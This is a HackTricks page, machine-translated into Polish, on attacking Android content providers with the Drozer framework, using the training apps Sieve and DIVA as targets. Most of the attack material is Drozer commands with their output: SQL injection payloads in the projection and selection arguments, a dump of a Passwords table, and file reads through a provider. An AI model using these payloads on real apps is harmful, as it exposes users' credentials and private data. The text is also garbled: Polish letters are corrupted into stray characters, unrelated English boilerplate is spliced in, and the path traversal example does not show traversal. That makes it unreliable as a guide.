# Wykorzystywanie dostawc贸w treci

## Wykorzystywanie dostawc贸w treci

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wprowadzenie

Dane s **dostarczane z jednej aplikacji do innych** na 偶danie za pomoc komponentu znanego jako **dostawca treci**. Te 偶dania s obsugiwane za pomoc metod klasy **ContentResolver**. Dostawcy treci mog przechowywa swoje dane w r贸偶nych lokalizacjach, takich jak **baza danych**, **pliki** lub przez **sie**.

W pliku _Manifest.xml_ konieczne jest zadeklarowanie dostawcy treci. Na przykad:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
Aby uzyska dostp do `content://com.mwr.example.sieve.DBContentProvider/Keys`, wymagane jest uprawnienie `READ_KEYS`. Ciekawym jest, 偶e cie偶ka `/Keys/` jest dostpna w nastpujcym fragmencie, kt贸ry nie jest chroniony z powodu bdu programisty, kt贸ry zabezpieczy `/Keys`, ale zadeklarowa `/Keys/`.

**Mo偶liwe jest uzyskanie dostpu do prywatnych danych lub wykorzystanie podatnoci (wstrzyknicie SQL lub przechodzenie po cie偶kach).**

## Uzyskaj informacje z **publicznych dostawc贸w treci**
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
Mo偶liwe jest zo偶enie w cao sposobu dotarcia do **DBContentProvider** poprzez rozpoczcie URI od "_content://_". Ten podejcie opiera si na wskaz贸wkach uzyskanych dziki u偶yciu Drozera, gdzie kluczowe informacje zostay znalezione w katalogu _/Keys_.

Drozer mo偶e **pr贸bowa zgadywa i testowa kilka URI**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
Nale偶y r贸wnie偶 sprawdzi kod **ContentProvidera**, aby wyszuka zapytania:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

Jeli nie mo偶na znale藕 penych zapyta, mo偶na **sprawdzi, jakie nazwy s deklarowane przez ContentProvider** w metodzie `onCreate`:

![](<../../../.gitbook/assets/image (186).png>)

Zapytanie bdzie wyglda tak: `content://nazwa.pakietu.klasy/nazwa_zadeklarowana`

## **Content Providery oparte na bazie danych**

Prawdopodobnie wikszo Content Provider贸w jest u偶ywana jako **interfejs** dla **bazy danych**. Dlatego, jeli uzyskasz do niej dostp, bdziesz w stanie **wydobywa, aktualizowa, wstawia i usuwa** informacje.\
Sprawd藕, czy mo偶na **uzyska dostp do wra偶liwych informacji** lub spr贸buj je zmieni, aby **obej mechanizmy autoryzacji**.

Podczas sprawdzania kodu Content Providera, **sprawd藕** r贸wnie偶 funkcje o nazwach: _query, insert, update i delete_:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Poniewa偶 bdziesz w stanie je wywoa.

### Zapytanie o zawarto
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Wstawianie treci

Przeszukujc baz danych dowiesz si **nazw kolumn**, a nastpnie bdziesz m贸g wstawi dane do bazy:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Zauwa偶, 偶e podczas wstawiania i aktualizacji mo偶esz u偶y --string, aby wskaza cig znak贸w, --double, aby wskaza liczb zmiennoprzecinkow, --float, --integer, --long, --short, --boolean._

### Aktualizowanie treci

Znajc nazwy kolumn, mo偶esz r贸wnie偶 **modyfikowa wpisy**:

![](<../../../.gitbook/assets/image (190).png>)

### Usuwanie treci

![](<../../../.gitbook/assets/image (191).png>)

### **SQL Injection**

atwo przetestowa podatno na SQL Injection **(SQLite)**, manipulujc polami **projekcji** i **selekcji**, kt贸re s przekazywane do dostawcy treci.\
Podczas przeszukiwania dostawcy treci istniej 2 interesujce argumenty do wyszukiwania informacji: _--selection_ i _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

Mo偶esz spr贸bowa **wykorzysta** te **parametry** do przetestowania podatnoci na **SQL injection**:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Automatyczne odkrywanie SQLInjection za pomoc Drozera**

Drozer is a powerful security testing framework for Android applications. It provides a wide range of features to assist in the penetration testing of Android apps. One of its notable features is the ability to automatically discover SQL injection vulnerabilities in Android apps.

Drozer uses a technique called content provider injection to identify potential SQL injection points in an app. Content providers are components in Android apps that allow data to be shared between different apps. By injecting malicious SQL queries into content provider URIs, Drozer can determine if the app is vulnerable to SQL injection attacks.

To perform automatic SQL injection discovery with Drozer, follow these steps:

1. Install Drozer on your testing machine.
2. Connect your Android device to the testing machine using ADB.
3. Launch Drozer and start a session with the target app using the `drozer console connect` command.
4. Use the `run app.provider.finduris` command to identify the content provider URIs in the app.
5. Use the `run app.provider.query` command to inject SQL queries into the content provider URIs and check for potential SQL injection vulnerabilities.
6. Analyze the results and identify any vulnerable points in the app's content providers.

By automating the SQL injection discovery process, Drozer can save time and effort during the penetration testing of Android apps. However, it is important to note that this technique should only be used on apps that you have permission to test, as it can potentially cause data loss or other adverse effects if used maliciously.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Dostawcy treci oparte na systemie plik贸w**

Dostawcy treci mog r贸wnie偶 by u偶ywani do **dostpu do plik贸w:**

![](<../../../.gitbook/assets/image (193).png>)

### Odczytaj **plik**

Mo偶esz odczytywa pliki z dostawcy treci
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Przechodzenie po cie偶ce**

Jeli masz dostp do plik贸w, mo偶esz spr贸bowa wykorzysta przechodzenie po cie偶ce (w tym przypadku nie jest to konieczne, ale mo偶esz spr贸bowa u偶y "_../_" i podobnych sztuczek).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Automatyczne odkrywanie Path Traversal za pomoc Drozera**

Drozer is a powerful Android security testing framework that allows you to perform various security assessments on Android applications. One of the techniques it supports is the automatic discovery of Path Traversal vulnerabilities in Android applications.

Drozer uses a combination of static and dynamic analysis to identify potential Path Traversal vulnerabilities. It analyzes the application's code and behavior to determine if it is susceptible to this type of attack.

To use Drozer for automatic Path Traversal discovery, follow these steps:

1. Install Drozer on your testing machine.
2. Connect your Android device to the testing machine using ADB.
3. Launch Drozer and start a session with the target application.
4. Use the `run app.provider.find` command to search for content providers in the target application.
5. Use the `run app.provider.query` command to query each content provider for potential Path Traversal vulnerabilities.
6. Analyze the results and identify any potential vulnerabilities.

Drozer will automatically analyze the content providers in the target application and check if they are vulnerable to Path Traversal attacks. It will provide you with a detailed report of any potential vulnerabilities found.

By using Drozer's automatic Path Traversal discovery feature, you can quickly identify and assess the security of Android applications. This can help you uncover potential vulnerabilities and take appropriate measures to mitigate them.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## Odwoania

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
